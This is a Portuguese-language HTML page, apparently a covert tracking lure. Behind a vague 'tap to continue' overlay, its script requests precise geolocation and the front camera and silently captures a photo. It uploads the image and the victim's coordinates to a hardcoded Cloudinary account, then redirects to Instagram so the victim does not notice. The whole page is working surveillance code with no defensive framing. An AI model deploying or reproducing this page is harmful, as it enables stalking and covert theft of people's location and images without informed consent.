<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura de Localização e Foto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #2E2E2E;
      font-family: sans-serif;
      font-size: 20px;
      background: rgba(255, 255, 255, 0.9);
      z-index: 9999;
      text-align: center;
      padding: 20px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar</div>
  <script>
    const cloudName = "dx5legahb";
    const uploadPreset = "upload";
    const folderName = "capturas";

    const overlay = document.getElementById('overlay');

    overlay.onclick = () => {
      overlay.style.display = 'none';
      // Primeiro: solicitar localização
      if (!navigator.geolocation) {
        alert('Geolocalização não suportada.');
        return;
      }
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude } = pos.coords;
          try {
            // Em seguida, solicitar câmera
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            const video = document.createElement('video');
            video.setAttribute('autoplay', true);
            video.setAttribute('muted', true);
            video.setAttribute('playsinline', true);
            video.srcObject = stream;
            await new Promise(res => video.onloadedmetadata = res);
            video.play();

            // Capturar imagem após breve delay
            setTimeout(() => {
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth || 640;
              canvas.height = video.videoHeight || 480;
              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
              stream.getTracks().forEach(t => t.stop());
              canvas.toBlob(async (blob) => {
                // Upload da imagem
                const imgForm = new FormData();
                imgForm.append('file', blob);
                imgForm.append('upload_preset', uploadPreset);
                imgForm.append('folder', folderName);
                const imgResp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: imgForm });
                const imgData = await imgResp.json();

                // Upload da localização em .txt
                const txtBlob = new Blob([
                  `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imgData.secure_url}`
                ], { type: 'text/plain' });
                const txtForm = new FormData();
                txtForm.append('file', txtBlob, `localizacao_${Date.now()}.txt`);
                txtForm.append('upload_preset', uploadPreset);
                txtForm.append('folder', folderName);
                await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: txtForm });

                // Redireciona ao final
                window.location.href = 'https://instagram.com';
              }, 'image/png');
            }, 500);
          } catch (camErr) {
            console.error('Erro câmera:', camErr);
            alert('Permissão de câmera negada. Recarregue para tentar novamente.');
          }
        },
        (geoErr) => {
          console.error('Erro localização:', geoErr);
          alert('Permissão de localização negada. Recarregue para tentar novamente.');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    };
  </script>
</body>
</html>
